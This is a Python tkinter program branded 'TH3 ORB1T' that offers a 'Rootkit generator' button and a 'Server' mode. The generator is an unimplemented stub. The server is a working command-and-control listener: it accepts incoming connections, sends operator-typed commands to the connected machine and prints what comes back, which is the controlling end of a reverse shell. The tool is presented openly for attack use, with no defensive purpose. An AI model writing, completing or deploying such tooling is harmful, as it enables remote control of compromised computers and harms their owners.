from tkinter import *
from tqdm import tqdm
from time import sleep
import colorama
from colorama import Fore, Style
import socket
import subprocess
import time
from tkinter import messagebox


def session():

    global client


    host = str(entry11.get())
    port = int(entry22.get())
    socket1 = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    socket1.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1)
    socket1.bind((host , port))
    socket1.listen(5)

    while True:
        client , address = socket1.accept()
        print(Fore.RED + 'connected to ' + str(address[0]) + ' at port : ' + str(address[1]) + Fore.BLUE)
        while True:
            s = str(input(' >'))
            client.send(s.encode())
            clrecv = client.recv(1024).decode()
            time.sleep(0.5)
            print(clrecv)

    session()

def generator():
    global winscreen1
    winscreen1 = Toplevel(win)
    winscreen1.geometry('400x200')
    winscreen1.title('0rbit s3rv3r')
    messagebox.showinfo('Error','We will add  this in couple of days')
    lable2 = Label(winscreen1 , text='TH3 ORB1T')
    lable2.place(x = 120 , y = 30)
    lable3 = Label(winscreen1 , text='Host :')
    lable3.place(x = 80 , y = 60)
    entry4 = Entry(winscreen1)
    entry4.place(x = 120 , y = 60)
    lable5 = Label(winscreen1 , text='Port :')
    lable5.place(x = 82 , y = 90)
    entry6 = Entry(winscreen1)
    entry6.place(x = 120 , y = 90)
    lable5 = Label(winscreen1 , text='Filename :')
    lable5.place(x = 45 , y = 120)
    entry8 = Entry(winscreen1)
    entry8.place(x = 120 , y = 120)
    button4 = Button(winscreen1 , text = 'Generat' , command = generator1)
    button4.place(x = 80 , y = 160)
    button5 = Button(winscreen1 , text = 'Close' , command = close )
    button5.place(x = 250 , y = 160)

def generator1():
    messagebox.showinfo('Error','We are sorry \n this is unavilable \n for now')

def close():
    print(Fore.BLUE + 'We hope you had a great time ligally ;)')
    exit(Tk)

def server():
    global entry11
    global entry22
    global winscreen
    winscreen = Toplevel(win)
    winscreen.geometry('380x180')
    winscreen.title('0rbit s3rv3r')

    lable22 = Label(winscreen , text='TH3 ORB1T')
    lable22.place(x = 120 , y = 30)
    lable00 = Label(winscreen , text='host :')
    lable00.place(x = 80 , y = 60)
    entry11 = Entry(winscreen)
    entry11.place(x = 120 , y = 60)
    lable11 = Label(winscreen , text='port :')
    lable11.place(x = 80 , y = 90)
    entry22 = Entry(winscreen)
    entry22.place(x = 120 , y = 90)
    button7 = Button(winscreen , text = 'Listen' , command = session )
    button7.place(x = 80 , y = 130)
    button17 = Button(winscreen , text = 'Close' , command = close )
    button17.place(x = 250 , y = 130)


clear = 'clear'
subprocess.call( clear , shell=True )

for i in tqdm(range(10)):
    sleep(0.1)

print(Fore.BLUE + 'Welcome')
win = Tk()
win.geometry('380x180')
win.title('0rbit s3rv3r')

lable1 = Label(win , text='TH3 ORB1T')
lable1.place(x = 120 , y = 30)
button1 = Button(win , text= 'Rootkit generator' , command = generator)
button1.place(x = 120 , y = 60)
button2 = Button(win , text= 'Server' , command = server)
button2.place(x = 120 , y = 90)
button3 = Button(win , text= 'Exit' , command = close)
button3.place(x = 120 , y = 120)
win.mainloop()
